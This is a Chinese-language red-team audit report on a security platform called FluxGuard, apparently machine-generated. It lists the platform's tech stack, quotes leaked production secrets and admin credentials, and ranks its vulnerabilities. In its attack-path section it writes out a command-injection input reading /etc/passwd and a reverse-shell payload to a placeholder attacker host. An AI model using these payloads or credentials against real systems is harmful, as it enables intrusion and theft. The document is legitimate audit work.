# FluxGuard 红队情报分析报告

## 1. 技术栈识别

### 1.1 前端技术栈
| 组件 | 版本 | 说明 |
|------|------|------|
| React | 18.2.0 | 主要UI框架 |
| TypeScript | 5.2.2 | 开发语言 |
| Vite | 5.0.8 | 构建工具 |
| TailwindCSS | 3.4.1 | CSS框架 |
| Socket.IO Client | 4.8.3 | 实时通信 |

### 1.2 后端技术栈
| 组件 | 版本 | 说明 |
|------|------|------|
| Node.js | Express 4.18.2 | Web框架 |
| TypeScript | 5.3.3 | 开发语言 |
| SQLite | sql.js 1.10.0 | 嵌入式数据库 |
| Redis | ioredis 5.3.2 | 缓存/会话 |
| JWT | jsonwebtoken 9.0.2 | 身份验证 |
| Socket.IO | 4.7.4 | WebSocket |

### 1.3 第三方服务
- **AI服务**: Zhipu AI (GLM-4模型)
- **证书管理**: Let's Encrypt (greenlock-express)
- **漏洞扫描**: Nuclei (ProjectDiscovery)

---

## 2. 配置文件与密钥审计

### 2.1 发现的生产环境密钥 (CRITICAL)

#### 文件: `/mnt/x/want/fsce/.env`
```bash
# 生产环境JWT密钥 - 可用于伪造令牌
JWT_SECRET=FluxGuardJwtSecret_for_prod_2026_very_long_1234567890

# Redis密码
REDIS_PASSWORD=FluxGuardRedis123!

# API密钥
VALID_API_KEYS=prod-api-key
DEVICE_API_KEYS=prod-device-key
```

#### 文件: `/mnt/x/want/fsce/backend/.env` (开发环境)
```bash
# 开发环境硬编码凭证
ADMIN_EMAIL=admin@fluxguard.dev
ADMIN_PASSWORD=DevAdmin123456!
DEMO_EMAIL=demo@fluxguard.dev
DEMO_PASSWORD=DevDemo123456!
```

### 2.2 Docker Compose配置分析

#### 文件: `/mnt/x/want/fsce/docker-compose.yml`
- Redis密码通过环境变量注入
- JWT_SECRET是运行时必需变量
- 后端运行在3005端口
- 前端运行在5173端口

---

## 3. 攻击面分析

### 3.1 暴露的端点 (来自路由分析)

| 路由前缀 | 描述 | 认证要求 |
|---------|------|---------|
| `/api/auth/*` | 认证端点 | 公开 |
| `/api/agents/*` | 代理管理 | API密钥 |
| `/api/devices/*` | 设备管理 | API密钥 |
| `/api/alerts/*` | 告警管理 | JWT |
| `/api/deployments/*` | 部署管理 | JWT |
| `/api/admin/*` | 管理后台 | JWT + Admin角色 |
| `/api/investigation/*` | 调查API | JWT |

### 3.2 用户输入点

1. **认证接口**: `email`, `password`, `apiKey`
2. **扫描任务**: `target`, `severity`, `options`
3. **代理配置**: `agentId`, `config`, `rules`
4. **防火墙规则**: `ip`, `duration`, `reason`

---

## 4. TOP 10 高危漏洞清单

| 排名 | 漏洞ID | 漏洞类型 | 严重程度 | CVSS | 位置 |
|-----|--------|---------|---------|------|------|
| 1 | VULN-001 | 硬编码生产密钥 | Critical | 9.8 | `.env` |
| 2 | VULN-002 | JWT密钥泄露 | Critical | 9.1 | `.env` |
| 3 | VULN-003 | Redis密码泄露 | High | 8.5 | `.env` |
| 4 | VULN-004 | 命令注入 - firewall-controller | High | 8.4 | `firewall-controller.ts:196` |
| 5 | VULN-005 | 命令注入 - system-scanner | High | 8.4 | `system-scanner.ts` |
| 6 | VULN-006 | 硬编码开发凭证 | High | 7.8 | `backend/.env` |
| 7 | VULN-007 | XSS - innerHTML使用 | Medium | 6.8 | `frontend/js/app.js` |
| 8 | VULN-008 | API密钥硬编码 | Medium | 6.5 | `.env` |
| 9 | VULN-009 | 路径遍历 - 日志解析 | Medium | 5.8 | `traffic-monitor.ts` |
| 10 | VULN-010 | 信息泄露 - 错误信息 | Low | 4.3 | 多处 |

---

## 5. 详细漏洞分析

### 5.1 VULN-001: 硬编码生产密钥 (Critical)

**描述**: 生产环境的 `.env` 文件包含真实使用的密钥，这些密钥被提交到代码仓库。

**影响**:
- 攻击者可使用泄露的JWT_SECRET伪造任意用户令牌
- Redis密码泄露可直接连接缓存数据库
- API密钥泄露可未授权访问设备API

**证据**:
```bash
# 文件: /mnt/x/want/fsce/.env
JWT_SECRET=FluxGuardJwtSecret_for_prod_2026_very_long_1234567890
REDIS_PASSWORD=FluxGuardRedis123!
VALID_API_KEYS=prod-api-key
DEVICE_API_KEYS=prod-device-key
```

### 5.2 VULN-004: 命令注入漏洞 (High)

**描述**: `firewall-controller.ts` 中直接拼接用户输入到系统命令执行。

**漏洞代码** (第196行):
```typescript
private async blockWithIptables(ip: string): Promise<boolean> {
    try {
        await execAsync(`iptables -A INPUT -s ${ip} -j DROP`);  // 直接拼接
        return true;
    } catch (error: any) {
        logger.error(`iptables block failed: ${error.message}`);
        return false;
    }
}
```

**绕过方式**: 虽然代码中有 `isValidIP` 验证，但如果验证被绕过或存在缺陷，攻击者可注入命令:
```
输入: 192.168.1.1; cat /etc/passwd
执行: iptables -A INPUT -s 192.168.1.1; cat /etc/passwd -j DROP
```

### 5.3 VULN-007: XSS漏洞 (Medium)

**描述**: 前端代码使用 `innerHTML` 直接插入用户可控内容，存在XSS风险。

**漏洞代码** (`frontend/js/app.js`):
```javascript
// 第277行
tr.innerHTML = `
    <td>${event.timestamp}</td>
    <td>${event.type}</td>
    <td>${event.severity}</td>
    <td>${event.message}</td>
`;

// 第431行
tbody.innerHTML = events.map(event => `
    <tr>
        <td>${event.timestamp}</td>
        <td class="severity-${event.severity}">${event.severity}</td>
        <td>${event.source}</td>
        <td>${event.message}</td>
    </tr>
`).join('');
```

**风险**: 如果 `event` 对象的属性包含用户输入，可导致存储型或反射型XSS攻击。

---

## 6. 攻击路径图

### 攻击路径1: JWT密钥泄露到系统接管

```
[泄露的JWT_SECRET]
    ↓
[伪造Admin JWT令牌] ← /mnt/x/want/fsce/.env
    ↓
[访问/admin/* API端点]
    ↓
[获取所有租户数据]
    ↓
[系统完全接管]
```

### 攻击路径2: 命令注入到Root权限

```
[发现防火墙控制端点]
    ↓
[发送恶意IP: 192.168.1.1; bash -i >& /dev/tcp/attacker/4444 0>&1]
    ↓
[绕过IP验证或不验证直接执行]
    ↓
[在服务器上执行反向shell]
    ↓
[获得服务器root权限]
```

### 攻击路径3: XSS到会话劫持

```
[注入恶意XSS payload到告警消息]
    ↓
[管理员查看告警页面]
    ↓
[XSS执行: 窃取document.cookie]
    ↓
[发送管理员cookie到攻击者服务器]
    ↓
[劫持管理员会话]
    ↓
[以管理员身份执行操作]
```

---

## 7. 情报总结

### 7.1 系统架构理解

FluxGuard是一个基于以下架构的安全平台：
- **前端**: React + TypeScript + Vite + TailwindCSS
- **后端**: Node.js + Express + TypeScript
- **数据库**: SQLite (嵌入式) + Redis (缓存)
- **通信**: REST API + WebSocket (Socket.IO)
- **AI集成**: Zhipu AI GLM-4

### 7.2 安全控制绕过点

1. **JWT验证**: 密钥硬编码，可伪造令牌
2. **IP验证**: 存在绕过可能，导致命令注入
3. **API密钥**: 硬编码在生产配置中
4. **XSS防护**: 前端未充分转义用户输入

### 7.3 高价值目标

1. `/mnt/x/want/fsce/.env` - 生产密钥
2. `/mnt/x/want/fsce/backend/src/agent/firewall-controller.ts` - 命令注入点
3. `/mnt/x/want/fsce/frontend/js/app.js` - XSS漏洞
4. `/mnt/x/want/fsce/backend/src/middleware/auth.middleware.ts` - JWT验证逻辑

---

**报告生成时间**: 2026-02-16
**分析师**: 红队情报分析系统
**分类级别**: 内部机密 - 仅用于授权安全测试
